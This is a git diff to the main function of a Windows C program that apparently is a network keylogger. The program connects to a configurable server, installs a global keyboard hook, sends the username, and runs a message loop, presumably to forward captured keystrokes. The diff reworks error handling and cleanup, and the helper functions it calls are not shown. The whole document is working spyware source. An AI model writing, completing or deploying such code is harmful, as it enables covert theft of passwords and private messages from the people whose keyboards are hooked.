@@ -1,32 +1,50 @@
 #include "include.h"
 
 int main(void) {
+    wchar_t server_ip[IP_LEN] = L"127.0.0.1";
+    u_short server_port = 8080;
+    HHOOK hook = NULL;
+    int exit_status = EXIT_FAILURE;
+    WSADATA wsaData;
 
-	char SERVER_IP[IP_LEN] = "127.0.0.1";
-	u_short SERVER_PORT = 8080;
+    _setmode(_fileno(stdout), _O_U16TEXT);
+    _setmode(_fileno(stderr), _O_U16TEXT);
+    _setmode(_fileno(stdin), _O_U16TEXT);
 
-	if (!get_server_config(SERVER_IP, &SERVER_PORT)) {
-		return EXIT_FAILURE;
-	}
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        fwprintf(stderr, L"Error: WSAStartup Error. Error Code: %d\n", WSAGetLastError());
+        goto cleanup;
+    }
 
-	_setmode(_fileno(stdout), _O_U8TEXT);
-	_setmode(_fileno(stderr), _O_U8TEXT);
+    if (get_server_config(server_ip, &server_port) == EXIT_FAILURE) {
+        goto cleanup;
+    }
 
-	HHOOK hook = hook_the_keyboard();
-	if (!hook) {
-		return EXIT_FAILURE;
-	}
+    sock = connect_to_server(server_ip, server_port);
+    if (sock == INVALID_SOCKET) {
+        goto cleanup;
+    }
 
-	sock = connect_to_server(SERVER_IP, SERVER_PORT);
-	if (sock == INVALID_SOCKET) {
-		return EXIT_FAILURE;
-	}
+    hook = hook_the_keyboard();
+    if (!hook) {
+        goto cleanup;
+    }
 
-	send_username_to_server(sock);
+    if (send_username_to_server(sock) == EXIT_SUCCESS) {
+        run_message_loop();
+        exit_status = EXIT_SUCCESS;
+    }
 
-	run_message_loop();
-	UnhookWindowsHookEx(hook);
-	closesocket(sock);
-	WSACleanup();
-	return EXIT_SUCCESS;
+cleanup:
+    if (sock != INVALID_SOCKET) {
+        closesocket(sock);
+    }
+
+    if (hook != NULL) {
+        UnhookWindowsHookEx(hook);
+    }
+
+    WSACleanup();
+
+    return exit_status;
 }
